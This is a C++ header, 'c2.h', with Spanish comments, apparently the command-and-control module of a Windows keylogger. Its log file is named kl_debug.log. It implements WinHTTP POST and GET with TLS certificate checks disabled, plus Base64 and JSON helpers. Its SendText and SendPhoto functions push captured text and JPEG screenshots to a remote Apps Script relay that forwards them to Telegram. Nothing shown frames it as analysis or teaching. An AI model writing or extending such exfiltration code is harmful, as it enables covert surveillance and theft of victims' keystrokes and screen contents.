// c2.h
// Envío JSON al Apps Script (relay a Telegram). Sin token secreto.
#pragma once
#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <string>
#include <mutex>
#include <cstdio>

#pragma comment(lib, "winhttp.lib")

// ============================================================
//  DEBUG LOG (va a %TEMP%\kl_debug.log)
// ============================================================
static std::mutex g_logMtx;

static void DebugLog(const char* msg) {
    std::lock_guard<std::mutex> lk(g_logMtx);
    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    std::wstring full = std::wstring(tmpPath) + L"kl_debug.log";

    FILE* f = NULL;
    _wfopen_s(&f, full.c_str(), L"a");
    if (f) {
        SYSTEMTIME st; GetLocalTime(&st);
        fprintf(f, "[%02d:%02d:%02d] [T%lu] %s\n",
            st.wHour, st.wMinute, st.wSecond,
            GetCurrentThreadId(), msg);
        fclose(f);
    }
}

// ============================================================
//  HTTP MUTEX
// ============================================================
static std::mutex g_httpMtx;

// ============================================================
//  Parseo de URL
// ============================================================
static std::wstring ParseHost(const std::wstring& url) {
    size_t s = url.find(L"://"); if (s == std::wstring::npos) return L"";
    s += 3;
    size_t e = url.find(L'/', s);
    std::wstring hp = url.substr(s, e - s);
    size_t c = hp.find(L':');
    return (c == std::wstring::npos) ? hp : hp.substr(0, c);
}

static INTERNET_PORT ParsePort(const std::wstring& url) {
    size_t s = url.find(L"://"); if (s == std::wstring::npos) return 443;
    s += 3;
    size_t c = url.find(L':', s);
    if (c == std::wstring::npos) return (url.find(L"https://") == 0) ? 443 : 80;
    size_t e = url.find(L'/', c);
    return (INTERNET_PORT)_wtoi(url.substr(c + 1, e - c - 1).c_str());
}

static std::wstring ParsePath(const std::wstring& url) {
    size_t s = url.find(L"://"); if (s == std::wstring::npos) return L"/";
    s += 3;
    size_t sl = url.find(L'/', s);
    return (sl == std::wstring::npos) ? L"/" : url.substr(sl);
}

static bool IsHttps(const std::wstring& url) {
    return url.find(L"https://") == 0;
}

// ============================================================
//  Preparar request WinHTTP
// ============================================================
static HINTERNET PrepareRequest(const std::wstring& url, const wchar_t* method) {
    DebugLog("PR: entry");

    std::wstring host = ParseHost(url);
    std::wstring path = ParsePath(url);
    INTERNET_PORT port = ParsePort(url);
    bool https = IsHttps(url);

    char buf[128];
    sprintf_s(buf, sizeof(buf), "PR: host=%ls port=%d", host.c_str(), (int)port);
    DebugLog(buf);

    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { DebugLog("PR: WinHttpOpen FALLO"); return NULL; }
    DebugLog("PR: WinHttpOpen OK");

    WinHttpSetTimeouts(hSession, 5000, 5000, 10000, 15000);
    DebugLog("PR: SetTimeouts OK");

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), port, 0);
    if (!hConnect) {
        DebugLog("PR: WinHttpConnect FALLO");
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    DebugLog("PR: WinHttpConnect OK");

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path.c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        DebugLog("PR: WinHttpOpenRequest FALLO");
        WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return NULL;
    }
    DebugLog("PR: WinHttpOpenRequest OK");

    DWORD sf = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
               SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
               SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));
    DebugLog("PR: Security flags OK");

    return hRequest;
}

// ============================================================
//  POST
// ============================================================
static bool HttpPost(const std::wstring& url,
                     const void* data, size_t len,
                     const std::wstring& contentType) {
    std::lock_guard<std::mutex> lk(g_httpMtx);

    DebugLog("HttpPost: entry");
    HINTERNET hRequest = PrepareRequest(url, L"POST");
    if (!hRequest) { DebugLog("HttpPost: prepare FALLO"); return false; }
    DebugLog("HttpPost: prepare OK");

    std::wstring headers = L"Content-Type: " + contentType + L"\r\n";
    DebugLog("HttpPost: SendRequest...");

    BOOL ok = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1L,
        (LPVOID)data, (DWORD)len, (DWORD)len, 0);
    if (!ok) {
        DWORD err = GetLastError();
        char buf[128];
        sprintf_s(buf, "HttpPost: SendRequest FALLO err=%lu", err);
        DebugLog(buf);
        WinHttpCloseHandle(hRequest);
        return false;
    }
    DebugLog("HttpPost: SendRequest OK, ReceiveResponse...");

    ok = WinHttpReceiveResponse(hRequest, NULL);
    if (!ok) {
        DWORD err = GetLastError();
        char buf[128];
        sprintf_s(buf, "HttpPost: ReceiveResponse FALLO err=%lu", err);
        DebugLog(buf);
        WinHttpCloseHandle(hRequest);
        return false;
    }
    DebugLog("HttpPost: ReceiveResponse OK");

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

    char buf[64];
    sprintf_s(buf, "HttpPost: HTTP status=%lu", status);
    DebugLog(buf);

    WinHttpCloseHandle(hRequest);
    return (status >= 200 && status < 400);
}

// ============================================================
//  GET
// ============================================================
static std::string HttpGet(const std::wstring& url) {
    std::lock_guard<std::mutex> lk(g_httpMtx);

    HINTERNET hRequest = PrepareRequest(url, L"GET");
    if (!hRequest) return "";

    std::string result;
    if (WinHttpSendRequest(hRequest, 0, 0, 0, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, 0)) {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (!dwSize) break;
            std::vector<char> buf(dwSize + 1);
            DWORD read = 0;
            if (!WinHttpReadData(hRequest, buf.data(), dwSize, &read)) break;
            result.append(buf.data(), read);
        } while (dwSize > 0);
    }
    WinHttpCloseHandle(hRequest);
    return result;
}

// ============================================================
//  Base64
// ============================================================
static const char B64_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string Base64Encode(const std::vector<BYTE>& data) {
    std::string out;
    out.reserve(((data.size() + 2) / 3) * 4);
    size_t i = 0;
    while (i + 2 < data.size()) {
        UINT n = (data[i] << 16) | (data[i+1] << 8) | data[i+2];
        out += B64_CHARS[(n >> 18) & 63];
        out += B64_CHARS[(n >> 12) & 63];
        out += B64_CHARS[(n >> 6) & 63];
        out += B64_CHARS[n & 63];
        i += 3;
    }
    if (i < data.size()) {
        UINT n = data[i] << 16;
        if (i + 1 < data.size()) n |= data[i+1] << 8;
        out += B64_CHARS[(n >> 18) & 63];
        out += B64_CHARS[(n >> 12) & 63];
        out += (i + 1 < data.size()) ? B64_CHARS[(n >> 6) & 63] : '=';
        out += '=';
    }
    return out;
}

// ============================================================
//  JSON escape
// ============================================================
static std::string JsonEscape(const std::string& s) {
    std::string o; o.reserve(s.size() + 8);
    for (char c : s) {
        unsigned char u = (unsigned char)c;
        switch (c) {
            case '"':  o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n";  break;
            case '\r': o += "\\r";  break;
            case '\t': o += "\\t";  break;
            case '\b': o += "\\b";  break;
            case '\f': o += "\\f";  break;
            default:
                if (u < 0x20) {
                    char buf[8];
                    sprintf_s(buf, sizeof(buf), "\\u%04x", u);
                    o += buf;
                } else {
                    o += c;
                }
        }
    }
    return o;
}

// ============================================================
//  API pública
// ============================================================
static bool SendText(const std::wstring& url, const std::string& message) {
    std::string json;
    json.reserve(message.size() + 64);
    json += "{\"type\":\"text\",\"message\":\"";
    json += JsonEscape(message);
    json += "\"}";

    char buf[64];
    sprintf_s(buf, sizeof(buf), "SendText: json size=%zu", json.size());
    DebugLog(buf);

    return HttpPost(url, json.data(), json.size(), L"application/json");
}

static bool SendPhoto(const std::wstring& url,
                      const std::vector<BYTE>& jpg,
                      const std::string& caption) {
    std::string b64 = Base64Encode(jpg);

    char buf[64];
    sprintf_s(buf, sizeof(buf), "SendPhoto: b64 size=%zu", b64.size());
    DebugLog(buf);

    std::string json;
    json.reserve(b64.size() + 256);
    json += "{\"type\":\"photo\","
            "\"mime_type\":\"image/jpeg\","
            "\"file_name\":\"capture.jpg\","
            "\"caption\":\"";
    json += JsonEscape(caption);
    json += "\",\"file_data\":\"";
    json += b64;
    json += "\"}";

    sprintf_s(buf, sizeof(buf), "SendPhoto: json size=%zu", json.size());
    DebugLog(buf);

    return HttpPost(url, json.data(), json.size(), L"application/json");
}